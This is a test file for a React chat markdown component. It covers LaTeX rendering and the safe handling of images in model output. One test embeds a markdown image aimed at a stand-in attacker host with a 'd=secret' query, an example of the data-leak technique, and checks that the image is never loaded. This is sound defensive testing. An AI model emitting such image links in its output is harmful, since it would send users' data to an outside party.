import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { ChatMarkdown } from "@/components/chat/ChatMarkdown";
import { normalizeChatMath } from "@/components/chat/chatMarkdownMath";

describe("ChatMarkdown math", () => {
  it("renders LaTeX display delimiters emitted by chat models", () => {
    const { container } = render(
      <ChatMarkdown
        text={String.raw`The core operation is:

\[
\operatorname{Attention}(Q,K,V)
=\operatorname{softmax}\left(\frac{QK^\top}{\sqrt{d_k}}\right)V
\]`}
        papers={{}}
      />,
    );

    expect(container.querySelector(".katex-display")).not.toBeNull();
    expect(container.textContent).toContain("Attention");
  });

  it("renders LaTeX inline delimiters", () => {
    const { container } = render(
      <ChatMarkdown text={String.raw`Use \(QK^\top\) here.`} papers={{}} />,
    );

    expect(container.querySelector(".katex")).not.toBeNull();
    expect(container.querySelector(".katex-display")).toBeNull();
  });

  it("leaves delimiters in code and incomplete math unchanged", () => {
    const markdown = [
      "Inline: `\\(literal\\)`",
      "",
      "```tex",
      String.raw`\[literal\]`,
      "```",
      "",
      String.raw`Incomplete: \[x`,
    ].join("\n");

    expect(normalizeChatMath(markdown)).toBe(markdown);
  });
});

describe("ChatMarkdown images", () => {
  it("shows a remote image as a link and never loads it", () => {
    const { container } = render(
      <ChatMarkdown
        text="See ![leak](https://attacker.example/x.png?d=secret) here."
        papers={{}}
      />,
    );

    expect(container.querySelector("img")).toBeNull();
    const link = container.querySelector("a");
    expect(link?.getAttribute("href")).toBe("https://attacker.example/x.png?d=secret");
    expect(link?.textContent).toBe("leak");
  });

  it("shows non-HTTPS images as plain alt text", () => {
    const { container } = render(
      <ChatMarkdown
        text="![](http://attacker.example/x.png) ![diagram](data:image/png;base64,AAAA)"
        papers={{}}
      />,
    );

    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("Image");
    expect(container.textContent).toContain("diagram");
  });
});

describe("ChatMarkdown linked images", () => {
  it("keeps the outer link and adds no nested anchor", () => {
    const { container } = render(
      <ChatMarkdown
        text="[![Figure 1](https://arxiv.org/html/x/fig1.png)](https://example.org/paper)"
        papers={{}}
      />,
    );

    expect(container.querySelector("img")).toBeNull();
    const links = container.querySelectorAll("a");
    expect(links).toHaveLength(1);
    expect(links[0].getAttribute("href")).toBe("https://example.org/paper");
    expect(links[0].textContent).toBe("Figure 1");
  });
});
